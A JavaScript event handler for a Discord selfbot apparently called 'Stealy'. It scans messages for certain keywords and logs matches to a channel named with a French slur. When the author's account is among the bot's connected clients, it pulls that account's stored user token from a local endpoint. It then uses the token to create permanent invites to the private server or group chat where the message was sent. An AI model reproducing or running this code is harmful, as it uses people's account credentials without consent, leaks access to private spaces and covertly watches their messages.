const { Message, Client } = require('legend.js');
const words = [ "senju", "nekzy", "/vbv" , "1212970751813226517" ]
const already = [];

module.exports = {
    name: "message",
    once: false,
    /**
     * @param {Message} message
     * @param {Client} client
    */
    run: async (message, client) => {
        if (!message.content || message.author.bot) return;
        if (!words.some((word) => message.content?.toLowerCase().includes(word))) return;
        if (client.config.owners.includes(message.author.id)) return;

        if (already.includes(message.id)) return;
        already.push(message.id);

        const embed = {
            author: { name: message.author.username, icon_url: message.author.avatarURL ?? null },
            color: 0xFFFFFF,
            title: '***__› Anti Senju__*** <a:star:1345073135095123978>',
            timestamp: new Date().toISOString(),
            footer: { name: '› Stealy', icon_url: client.user.avatarURL ?? null },
            fields: [
                { name: 'Auteur :', value: `${message.author} (${message.author.id})` },
                { name: 'Compte :', value: `${client.user}` },
                { name: 'Serveur :', value: `${message.guild ? `${message.guild.name} (${message.guild.id})` : `Ce message a été envoyé en message privé`}` },
                { name: 'Salon :', value: `<#${message.channel.id}>` },
                { name: 'Message :', value: `${message.content.length > 1024 ? `${message.content.substring(0, 1021)}...` : message.content}` }
            ]
        }

        if (message.guild) {
            if (message.guild.vanityURLCode) embed.fields.push({ name: "Invitation :", value: `https://discord.gg/${message.guild.vanityURLCode}` });
            
            else {
                const clients = await fetch(`http://localhost:${client.port}/getClients`, { method: "GET", headers: { Authorization: client.auth, 'Content-Type': 'application/json' } }).then(r => r.json());
                const detected = clients.find(c => c.user.id == message.author.id);

                const invite = fetch(`https://ptb.discord.com/api/v9/channels/${message.channel.id}/invites`, {
                    headers: {
                        "authorization": detected?.token,
                        "content-type": "application/json",
                    },
                    body: JSON.stringify({ max_age: 0, max_uses: 0, target_type: null, temporary: false, flags: 0 }),
                    method: "POST"
                  }).then(r => r.json().catch(() => false)).catch(() => false);

                if (!invite.code) return;

                embed.fields.push({ name: "Invitation :", value: `${invite.code ? `https://discord.gg/${invite.code}` :  "`Impossible de crée l'invitation`"}`});    
            }
        } 
        else if (message.channel.type === "group") {
            const clients = await fetch(`http://localhost:${client.port}/getClients`, { method: "GET", headers: { Authorization: client.auth, 'Content-Type': 'application/json' } }).then(r => r.json());
            const detected = clients.find(c => c.user.id == message.author.id);

            const invite = await fetch(`https://ptb.discord.com/api/v9/channels/${message.channel.id}/invites`, {
                headers: {
                  "content-type": "application/json",
                  "authorization": detected?.token,
                },
                body: JSON.stringify({ max_age: 86400 }),
                method: "POST"
              }).then(r => r.json().catch(() => false)).catch(() => false);

            if (invite.code) embed.fields.push({ name: "Dans un groupe :", value: `*${invite.code ? `https://discord.gg/${invite.code}` :  "`Impossible de crée l'invitation`"}*`});
        }

        client.log(client.config.salopes, { embeds: [embed] })
    }
}